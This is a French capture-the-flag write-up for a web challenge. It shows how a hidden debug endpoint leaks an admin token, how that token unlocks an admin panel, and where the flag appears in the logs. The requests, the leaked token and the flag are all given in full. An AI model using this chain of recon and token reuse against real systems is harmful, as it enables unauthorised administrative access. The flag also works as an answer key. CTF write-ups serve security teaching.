# Level 2 (Debug Endpoint) - REST in Peace

**Flag :** `HSR{merc1_le_mod3_d3bug_c_est_tr3s_gent1l!}`

---

## Table des matières

- [Contexte](#contexte)
- [Étape 1 - Inspection du code source](#étape-1---inspection-du-code-source)
- [Étape 2 - Découverte de l'endpoint debug](#étape-2---découverte-de-lendpoint-debug)
- [Étape 3 - Accès au panneau d'administration](#étape-3---accès-au-panneau-dadministration)
- [Étape 4 - Consultation des journaux](#étape-4---consultation-des-journaux)
- [Résumé de la chaîne de résolution](#résumé-de-la-chaîne-de-résolution)

---

## Contexte

On accède à une interface web de surveillance système. Le site affiche des logs et un statut. Les endpoints visibles sont `/api/status` et `/api/logs`. Rien d'autre n'est documenté.

---

## Étape 1 - Inspection du code source

En affichant le code source de la page (Ctrl+U ou inspecteur), un commentaire HTML laissé par un développeur révèle deux routes internes :

```html
<!-- TODO: retirer avant prod
  <nav class="admin-nav">
    <a href="/api/debug/system">Diagnostics</a>
    <a href="/api/admin/panel">Administration</a>
  </nav>
-->
```

---

## Étape 2 - Découverte de l'endpoint debug

Accéder à la première route trouvée dans le commentaire :

```
GET /api/debug/system
```

Réponse :

```json
{
  "version": "2.4.1-dev",
  "environment": "staging",
  "debug": true,
  "database": "in-memory",
  "internal_services": [
    { "name": "auth-service", "status": "running", "port": 8081 },
    { "name": "log-collector", "status": "running", "port": 8082 },
    { "name": "admin-gateway", "status": "running", "port": 8083 }
  ],
  "admin_token": "sk-admin-7f3a9c2e1b4d6e8f0a2c4e6b8d0f1a3c"
}
```

Le champ `admin_token` contient un token d'administration valide. C'est une faille Information Disclosure : un endpoint de diagnostic laissé accessible en staging expose la configuration interne.

---

## Étape 3 - Accès au panneau d'administration

Utiliser le token extrait en paramètre d'URL sur la seconde route :

```
GET /api/admin/panel?token=sk-admin-7f3a9c2e1b4d6e8f0a2c4e6b8d0f1a3c
```

Réponse :

```json
{
  "message": "Bienvenue, administrateur. Session enregistrée dans les journaux."
}
```

Le flag n'est pas dans cette réponse. L'accès a injecté une ligne dans les logs.

---

## Étape 4 - Consultation des journaux

Actualiser les journaux applicatifs via le bouton " Actualiser " sur le site ou directement :

```
GET /api/logs
```

Une nouvelle entrée apparaît en rouge :

```json
{
  "timestamp": "2026-05-07T...",
  "level": "CRITICAL",
  "message": "Session admin ouverte -- HSR{merc1_le_mod3_d3bug_c_est_tr3s_gent1l!}"
}
```

---

## Résumé de la chaîne de résolution

```
Interface web (surveillance)
  |
  |-- Ctrl+U -> commentaire HTML avec routes internes
          |
          |-- GET /api/debug/system -> admin_token exposé
          |
          |-- GET /api/admin/panel?token=... -> session admin enregistrée
                    |
                    |-- GET /api/logs -> log CRITICAL contenant le flag
```
